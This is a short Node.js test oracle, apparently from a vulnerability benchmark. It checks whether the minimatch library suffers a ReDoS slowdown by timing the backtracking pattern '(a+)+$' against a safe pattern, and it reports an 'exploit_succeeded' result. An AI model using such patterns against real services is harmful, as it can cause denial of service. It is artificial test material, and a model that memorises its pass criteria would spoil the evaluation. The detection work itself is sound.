const minimatch = require('minimatch');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function nowMs() {
  return Number(process.hrtime.bigint() / 1000000n);
}

function measure(fn, rounds) {
  const start = nowMs();
  for (let i = 0; i < rounds; i++) fn();
  return nowMs() - start;
}

function finish() {
  const out = {
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence)
  };
  console.log('ORACLE_RESULT ' + JSON.stringify(out));
}

try {
  const benign = minimatch('abc', 'a*');
  if (typeof benign !== 'boolean') {
    throw new Error('benign_non_boolean');
  }

  operation_completed = true;

  const attackPath = 'aaaaaaaaaaaaaaaaaaaaX';
  const attackPattern = '(a+)+$';
  const safePattern = 'a+$';

  // Warm-up
  minimatch(attackPath, attackPattern);
  minimatch(attackPath, safePattern);

  const rounds = 150;
  const tSafe = measure(() => { minimatch(attackPath, safePattern); }, rounds);
  const tMal = measure(() => { minimatch(attackPath, attackPattern); }, rounds);

  const ratio = tSafe > 0 ? (tMal / tSafe) : (tMal > 0 ? 9999 : 1);

  // Vulnerable should exhibit clear slowdown; fixed should not.
  if (tMal - tSafe >= 120 && ratio >= 3) {
    exploit_succeeded = true;
    evidence = 'redos_slowdown_detected:safe_ms=' + tSafe + ',mal_ms=' + tMal + ',ratio=' + ratio.toFixed(2);
  } else {
    exploit_succeeded = false;
    evidence = 'no_material_slowdown:safe_ms=' + tSafe + ',mal_ms=' + tMal + ',ratio=' + ratio.toFixed(2);
  }
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_benign_failure:' + ((err && err.message) ? err.message : String(err));
}

finish();